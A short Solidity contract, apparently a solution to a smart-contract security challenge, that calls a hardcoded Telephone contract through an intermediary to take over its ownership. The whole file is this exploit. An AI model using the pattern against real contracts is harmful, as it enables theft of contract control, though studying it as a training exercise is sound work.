// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
import './Telephone.sol';

contract TelephoneHack {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    Telephone public telephone =
        Telephone(0xD956969E96304e7B0f98F9FA9BcbF85dF52D18D5);

    function changeTelephoneOwner(address _address) public {
        telephone.changeOwner(_address);
    }
}
